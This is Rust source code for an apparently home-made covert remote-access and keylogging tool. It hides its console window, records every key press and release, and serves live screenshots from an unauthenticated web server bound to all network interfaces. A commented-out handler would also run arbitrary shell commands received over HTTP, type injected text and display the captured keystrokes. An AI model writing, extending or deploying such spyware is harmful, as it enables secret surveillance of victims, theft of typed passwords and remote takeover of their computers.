#![windows_subsystem = "windows"]
use axum::{
    Form, Router,
    http::{HeaderMap, HeaderValue},
    response::{Html, IntoResponse},
    routing::get,
};
use device_query::{DeviceEvents, DeviceEventsHandler};
use enigo::{Enigo, Keyboard, Settings};
use rdev::listen;
use serde::Deserialize;
use shlex::split;
use std::{
    env::args,
    io::Cursor,
    sync::{Arc, Mutex},
    time::Duration,
};
use std::collections::HashMap;
use std::iter::Map;
use tokio::{main, net::TcpListener, process::Command, spawn};
use xcap::{Monitor, image::ImageFormat};
#[derive(Deserialize)]
struct Frm {
    choice: String,
    text: String,
}
#[main]
async fn main() {
    let mut arg = args();
    arg.next();
    let lock = Arc::new(Mutex::new(String::new()));
    let lock2 = lock.clone();
    let lock3 = lock.clone();
    let lck = Arc::new(Mutex::new(String::new()));
    let lck2 = lck.clone();
    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
    let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));
    let _down =
        handler.on_key_down(move |key| *lock2.lock().unwrap() += &(key.to_string() + "&#x2193; "));
    let _up =
        handler.on_key_up(move |key| *lock3.lock().unwrap() += &(key.to_string() + "&#x2191; "));
    spawn(async {
        let lckin = lck2;
        loop {
            let l = lckin.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    *l.lock().unwrap() += match &name[..] {
                        "&" => "&amp;",
                        "<" => "&lt;",
                        others => others,
                    };
                }
            })
            .unwrap();
        }
    });
    let mut head = HeaderMap::new();
    head.insert(
        "Cache-Control",
        HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
    );
    head.insert("Expires", HeaderValue::from_static("-1"));
    head.insert("Pragma", HeaderValue::from_static("no-cache"));
    axum::serve(
        TcpListener::bind(String::from("0.0.0.0:") +
            &arg.next().unwrap_or(String::from("1145"))).await.unwrap(),
        Router::new()
    .route("/", get(async move |frm: Form</*Option<Frm>*/ HashMap<String, String> >| { //参数Map
        println!("{:#?}", frm);
        return "Hello";/*
        if let Form(Some(Frm{choice, text})) = frm {
            match &choice[..] {
                "cmd" => {
                    let parts: Vec<String> = split(&text).unwrap();
                    Command::new(&parts[0]).args(&parts[1..]).spawn().unwrap();
                },
                "code" => (), // TODO: code
                "eni" => (), // TODO: enigo
                "rdev" => (), // TODO: rdev
                "txt" => enigo.lock().unwrap().text(&text).unwrap(),
                "clr" => {
                    lock.lock().unwrap().clear();
                    lck.lock().unwrap().clear();
                },
                _ => ()
            }
        }
        (head, Html(
            String::from(
                r#"<!DOCTYPE html><html><body><form action="/cmd"><select name="choice"><option value="cmd">命令</option><option value="code">键盘码</option><option value="eni">enigo按键</option><option value="rdev">rdev按键</option><option value="txt">输入</option><option value="clr">清空</option></select><input name="text"/><input type="submit"/></form><pre style="white-space:pre-wrap;">"#,
            ) + lock.lock().unwrap().as_str() + "<hr>" + lck.lock().unwrap().as_str()
                + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},160);</script></body></html>"#,
        )).into_response()*/
    })) .route("/screen.bmp", get(async || {
        let mut buf = Cursor::new(Vec::new());
        Monitor::all().unwrap()[0].capture_image().unwrap()
            .write_to(&mut buf, ImageFormat::Bmp).unwrap();
        buf.into_inner()
    }))).await.unwrap();
}
